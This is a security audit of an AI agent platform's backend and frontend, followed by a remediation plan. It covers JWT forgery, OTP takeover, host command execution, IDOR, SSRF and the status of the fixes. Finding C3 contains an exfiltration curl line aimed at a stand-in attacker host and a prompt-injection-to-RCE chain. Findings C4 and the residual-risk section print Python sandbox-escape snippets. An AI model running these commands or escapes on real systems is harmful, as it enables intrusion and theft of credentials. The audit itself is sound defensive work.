# Chronos Security Audit

Scope: `apps/api` (FastAPI backend), `apps/web` (Next.js frontend), deployment config.
Method: static review of auth/authz, tenant isolation, the three seams, tool broker,
connectors, credential vault, code/browser execution, injection, secrets, CORS, uploads,
and the frontend. Findings verified against source.

A note on the tenancy model: member lookup is currently pinned to `settings.org_id`
(`core/members.py`), so the cross-tenant IDOR bugs below are **latent today** but become
directly exploitable the moment a second org/member exists. They are real defects and
violate the project's own RULE 9, so they are rated on true impact.

---

## Critical

### C1 — Default JWT signing secret enables token forgery / full auth bypass
`core/config.py:51` defaults `jwt_secret = "change-me-in-dev"`; `.env.example:39` ships the
same value. Used to sign/verify HS256 session tokens (`core/auth.py:23,32`). If deployed
without an override, anyone can forge a JWT for any `member_id` and authenticate as them,
defeating tenant isolation entirely. There is no startup guard rejecting the default.
`jwt.decode` also validates only the signature — no `options={"require":["exp"]}`, no
`iss`/`aud`, and `payload["sub"]` is indexed without a guard (500 on malformed token).

### C2 — Dev OTP is computable offline and returned in the HTTP response
`routers/auth.py:52-57` computes the login OTP as `HMAC-SHA256(jwt_secret, "email:window")`
truncated to 6 digits. With the default/public `jwt_secret` (C1), an attacker computes any
user's current OTP offline for any email. Worse, `request-otp` returns the code directly:
`{"status": "...", "dev_code": code}` (`auth.py:94`) and prints it to stdout. `verify-otp`
accepts the current and previous 10-min window (`auth.py:102-107`), is not invalidated on
use, and has **no rate limit / lockout** — a pure brute force of the 6-digit space is also
unthrottled. `auth_provider` defaults to `dev_otp` (`config.py:55`) with no production guard.
This is a full account-takeover primitive for any seeded member.

### C3 — Cloud `computer.exec` is host RCE, not behind the approval hard-floor
`connectors/computer.py:130-140` runs commands via `/bin/sh -c <command>` on the API host.
`_ALWAYS_APPROVAL_TOOLS` (`tool_broker.py:26-34`) lists `local_computer.exec` but **not the
cloud `computer.exec` / `computer.install_package`** — so under `full_auto` autonomy they run
with no approval. The only barrier is a 6-marker substring denylist (`rm -rf`, `mkfs`,
`shutdown`, …) trivially bypassed (`rm  -rf` with a double space, `cat /etc/passwd`,
`curl http://attacker/$(cat .env|base64)`, reverse shells). No chroot/namespace/seccomp.
Exploit chain: prompt-injected web content → agent runs a "diagnostic" → RCE on the backend
with the API process's privileges (VAULT_ENCRYPTION_KEY, DB creds, AWS keys in env).

### C4 — Code-exec sandboxes (`code.python`, `data.run`) rely on a bypassable regex denylist
`connectors/code.py:16-26` and `connectors/data_analysis.py:53-75` run user/LLM code via
`python -I -S -c` filtered by a lexical regex blocklist. The blocklist does not stop
builtin resolution by name: `__builtins__.__dict__['__imp'+'ort__']('os')`,
`getattr(__builtins__,'ex'+'ec')(...)`, etc., and only blocks absolute-path `open('/...')`,
leaving `..` relative traversal open. RLIMITs cap CPU/mem but there is no network namespace
or read-only FS, so once `os`/`socket` is obtained it is in-process RCE on the host. A
lexical blocklist is not a security boundary.

---

## High

### H1 — IDOR: cross-tenant approval read & decision
`routers/approvals.py`: `get_approval` (92-99) and `decide_approval` (110-134) fetch/update
by `approval_id` with **no `organization_id` filter**; the batch path updates all rows sharing
`task_id`/`step_id` unscoped. `permission.check(..., "decide_approval", ...)` only checks the
caller's *role*, not org ownership. A member of org B can approve org A's pending
approvals — and per RULE 8 that authorizes sensitive external actions (email send, publish,
payment) for another tenant.

### H2 — IDOR: cross-tenant task disclosure
`routers/tasks.py:201-209` `get_task_detail` selects by `task_id` only, returning goal, plan,
agent_state, and result. Every sibling endpoint in the file filters by `organization_id` —
this one is the outlier. Any authenticated user can read any task in any tenant.

### H3 — Permission seam does not enforce for most call sites
`core/permissions.py:89-90`: `check()` only raises when OpenFGA is enabled AND the action maps
to a known project relation. For conversation/memory/task/connector actions (e.g.
`view_conversation`, `delete_memory`, `view_task`) the action is unknown, so it returns `True`
after only writing an audit row. Enforcement is also globally OFF by default
(`permissions_enforce=False`, `openfga_api_url=""`). Net: in the default deployment the only
real access controls are the hand-written per-query `organization_id`/`member_id` filters —
which H1/H2 show are inconsistently applied, with no backstop where they're missing.

### H4 — SSRF across every URL-fetching surface
No URL validation (no block of loopback, RFC1918, link-local `169.254.169.254`, `file://`,
non-http schemes) on:
- `browser.fetch` / `browser.extract_contacts` — `page.goto(url)` on arbitrary URLs
  (`connectors/browser.py:185-273`); cloud-metadata / internal-service exfiltration.
- `generic_http` — LLM-controlled `endpoint` joined to stored `api_base`, with the OAuth
  bearer token attached unconditionally (`connectors/generic_http.py:74-133`).
- Remote MCP `_remote_request` POSTs to `server_url` with no host validation; local MCP
  `_stdio_request` runs `shlex.split(command)` as a subprocess with no allowlist
  (`connectors/mcp_client.py:41-110`).

### H5 — All-zeros `VAULT_ENCRYPTION_KEY` shipped in `.env.example`
`.env.example:55` ships `VAULT_ENCRYPTION_KEY=0000…0000` (64 hex zeros). The vault AES-256-GCM-
encrypts every tenant's connector credentials with this key. A self-hoster inheriting the
example encrypts all credentials under a publicly known key — anyone with DB/Redis/backup
read access decrypts every Gmail/Slack/HubSpot token. (The vault crypto itself is correct:
fresh 12-byte nonce per op, key length validated, fails closed when unset — the trap is the
example value.)

### H6 — JWT stored in `localStorage` (XSS-stealable) + session cookie missing `Secure`
`apps/web/lib/api.ts:14-17` reads the bearer token from `localStorage` even though the backend
also sets an httpOnly `chronos_session` cookie. Any XSS or malicious dependency exfiltrates the
token. The cookie is set without `secure=True` (`auth.py:124,145,166`), so it can traverse
plaintext HTTP.

### H7 — Broad credentialed CORS regex
`main.py:31-44`: `allow_credentials=True` with `allow_origin_regex` permitting any
`http(s)://(localhost|127.0.0.1):30xx` plus `allow_methods/headers=["*"]`. Credentialed
responses are reflected to any local origin in the 3000-3099 range — unnecessary attack
surface, especially if left live in deployed environments.

---

## Medium

- **M1 — Untrusted-content→write gate depends on a caller-supplied flag.** `tool_broker.py:112-116`
  only blocks writes when the caller passes `__triggered_by_untrusted_content=True`; nothing
  derives it from prior tool results flagged as untrusted. Prompt-injection protection is
  advisory only and the scanner (`untrusted_content.py`) is a bypassable phrase list.
- **M2 — Loop/rate limits are weak.** `tool_broker.py:170-186`: loop detection keys on an exact
  `sha256(tool+args)`, so varying one arg byte evades it; rate limit is 10/min/org across all
  tools (a runaway sub-agent starves the org, and 10 `computer.exec`/min is ample for C3).
- **M3 — Verbose errors leaked to clients.** `/health` returns raw exception text (DSN/host
  fragments) to unauthenticated callers (`main.py:229-262`); several routers echo upstream
  exception bodies via `detail=str(exc)` (`connectors.py:244,287,443,483`, `auth.py:139,159`).
- **M4 — No `Secure`/short TTL on OTP store; replay within window.** `_otp_store` is process-
  global, unbounded, not invalidated on use; codes valid up to ~20 min across two windows.
- **M5 — Hardcoded dev creds** in `docker-compose.yml` / `.env.example` (Postgres `chronos`,
  MinIO `chronos123`) — dev-only but easy to carry forward.

## Low

- **L1 — `gmail.send` is structurally dead** (`connectors/gmail.py:293-294` raises
  `ApprovalRequired` even after the broker's gate clears) — fail-safe, but the approved-send
  path never sends. Diverges from RULE 8's intent.
- **L2 — File uploads**: 25 MB limit and org-scoped UUID paths are good; gaps are no
  content-type allowlist and full read-into-memory before the size check (`attachments.py:180-182`).
- **L3 — `dangerouslySetInnerHTML`** for connector icons (`chat/page.tsx:5398`) is currently safe
  (static SVG constants) but would be stored XSS if `icon_svg` ever becomes DB/tenant-supplied.
- **L4 — Syntax/logic bug** `connectors/repo_workspace.py:77`: `if token.startswith("../" in token:`
  — malformed; breaks the pytest-command traversal check.

## Verified clean

- **SQL injection**: none. SQLAlchemy Core with bound params throughout; the only f-string into
  SQL (`core/memory.py` scope filter) uses machine-generated placeholders with values bound.
- **Vault crypto**: AES-256-GCM done correctly, fails closed (H5 is the example value, not the code).
- **Path jailing**: `core/workspace.py` `jailed_path` (resolve + parent check) reused correctly;
  `repo.clone` URL allowlist is strict.
- **Admin role checks**: `routers/settings.py` consistently calls `require_admin`.
- **Artifacts / memory writes / chat mutations / projects**: properly org+member scoped.
- **OAuth callbacks**: HMAC-signed `state` (CSRF protection present).
- **Markdown / artifact iframes**: react-markdown without rehype-raw; sandboxed iframes with CSP.

---

## Remediation plan (priority order)

### Phase 0 — Secrets & auth hardening (highest ROI, low effort)
1. **Fail startup** if `jwt_secret`/`vault_encryption_key` are the default/empty/all-zeros
   outside an explicit dev flag (C1, H5). Add `options={"require":["exp"]}` and a `sub` guard
   to `jwt.decode`, validate token shape (C1).
2. **Gate dev OTP to dev only**: never return/print `dev_code` outside dev; require
   `auth_provider=dev_otp` to be explicitly enabled with a `DEV_MODE` guard; rotate to a
   random per-request OTP stored server-side rather than HMAC-of-secret (C2).
3. **Rate-limit + lockout** on `verify-otp` (per email and per IP), invalidate code on use,
   narrow to a single window (C2, M4).
4. **Move auth to the httpOnly cookie**, stop persisting the token in `localStorage`, set
   `secure=True` + `samesite=strict` outside dev (H6).
5. **Replace `.env.example` traps** with empty placeholders that fail loudly (H5, M5).

### Phase 1 — Tenant isolation (close the IDOR holes)
6. Add `organization_id` filters to `get_task_detail` (H2) and all three approval handlers
   incl. the batch path (H1).
7. Make the permission seam **fail-closed for unknown actions** (or at minimum assert org
   ownership for every resource-scoped action), so missing query filters have a backstop (H3).
8. Add a repo-wide test asserting every resource-fetch-by-id endpoint filters by org.

### Phase 2 — Execution sandboxing (the RCE class)
9. Add `computer.exec` / `computer.install_package` to `_ALWAYS_APPROVAL_TOOLS` (C3, quick win).
10. Replace `/bin/sh -c` host execution and the regex code sandboxes with a real isolation
    boundary: container/gVisor/firejail with no network namespace, read-only FS outside the
    per-task workspace, dropped capabilities, seccomp (C3, C4). Lexical denylists are not a
    boundary and should be removed once isolation lands.

### Phase 3 — SSRF & egress control
11. Add a shared SSRF guard (resolve host, block loopback/RFC1918/link-local/`file://`/non-http,
    re-check after redirects) applied to `browser.fetch`/`search`, `generic_http`, and remote
    MCP; allowlist local-MCP spawn commands (H4).
12. Derive `__triggered_by_untrusted_content` inside the broker from prior tool results flagged
    untrusted, rather than trusting the caller (M1).

### Phase 4 — Hardening & hygiene
13. Pin CORS to actual frontend hosts; drop the localhost regex outside dev (H7).
14. Generic client-facing error messages; lock `/health` detail behind auth (M3).
15. Tighten loop detection (normalize args / detect destructive families) and per-tool rate
    limits (M2). Content-type allowlist + streaming size check on uploads (L2). Fix the
    `repo_workspace.py:77` syntax bug (L4) and the dead `gmail.send` path (L1).

---

## Remediation status (this change)

### Fixed
- **C1** — `core/config.py` now refuses to boot (`enforce_production_secrets`) when
  `ENVIRONMENT` is not development and `JWT_SECRET` is the default/empty. `core/auth.py`
  hardens `jwt.decode` with `options={"require": ["exp", "sub"]}` and a `sub` guard.
- **C2** — dev OTP is now a random, single-use, 5-minute code stored server-side (no longer
  derived from `JWT_SECRET`); the code is never returned in the HTTP response; `verify-otp`
  enforces a 5-attempt lockout and consumes the code on success; `_dev_otp_enabled()` is hard-
  gated to non-production (endpoint 404s in prod, and the config guard refuses to boot with
  `dev_otp` in production).
- **C3** — `computer.exec` and `computer.install_package` added to the broker's
  `_ALWAYS_APPROVAL_TOOLS` hard-floor: cloud shell can no longer run unattended under full_auto.
- **H1** — `routers/approvals.py` `get_approval` and `decide_approval` (incl. the batch path)
  now filter every read/update by `member.organization_id`.
- **H2** — `routers/tasks.py` `get_task_detail` now filters by `organization_id`.
- **H4** — new `core/ssrf.py` (`assert_safe_url`) blocks non-HTTP schemes and loopback/private/
  link-local/reserved hosts (incl. `169.254.169.254`), wired into `browser.fetch`/
  `extract_contacts`, the `generic_http` connector, and remote MCP `_remote_request`.
- **H5** — `.env.example` no longer ships an all-zeros vault key or implies the default JWT
  secret is usable; both are placeholders with `openssl rand -hex 32` guidance, and the boot
  guard enforces them in production.
- **H7** — `main.py` CORS pins to the configured frontend origin in production; the localhost
  regex is registered only in development.
- **M3** — `/health` returns only `ok`/`error`/`degraded` and logs exception detail server-side.
- **M4 (partial)** — OTP store entries now expire and are single-use (replay window closed).
- **C4/C3 sandboxes (defence-in-depth only)** — `code.py` / `data_analysis.py` denylists
  extended to block `eval`/`exec`/`compile`/`breakpoint`, `__builtins__`, dunder-traversal
  (`__subclasses__`/`__bases__`/`__mro__`/`__globals__`), and `../` relative traversal.

### Residual risk — still open (require infra / larger change)
- **C4 (root cause)** — the Python sandboxes remain lexical denylists, which cannot fully
  contain Python (e.g. `().__class__.__bases__[0].__subclasses__()`). The real fix is OS-level
  isolation: run untrusted code in a container/namespace with **no network**, a read-only FS
  outside the per-task workspace, dropped capabilities, and seccomp. Until then, treat
  `code.python`/`data.run` as capable of host access.
- **H3** — the permission seam is still allow-all for non-project actions by design; access
  control rests on per-query org filters. Making it globally fail-closed needs seeded OpenFGA
  tuples for every resource type. Mitigation landed by closing the known IDOR gaps (H1/H2); a
  repo-wide regression test asserting org-scoping on every fetch-by-id endpoint should follow.
- **H6** — frontend still stores the JWT in `localStorage` (XSS-stealable). The backend now
  sets a `Secure`+`httpOnly`+`SameSite=strict` cookie via `set_session_cookie`, but a full
  cutover to cookie-only auth requires same-origin (or proxied) deployment of web↔API and
  touches SSE/upload code paths; deferred to avoid breaking auth blind.
- **Local MCP `_stdio_request`** still spawns an arbitrary stored `command`; creating a local
  MCP server record should be restricted to admins and/or an allowlist (config-level RCE).
- **M2** — loop detection still keys on an exact args hash; destructive loops with varying args
  evade it. Rate limit remains global per-org.
- **L2** — uploads still accept any content-type and buffer the body before the size check.
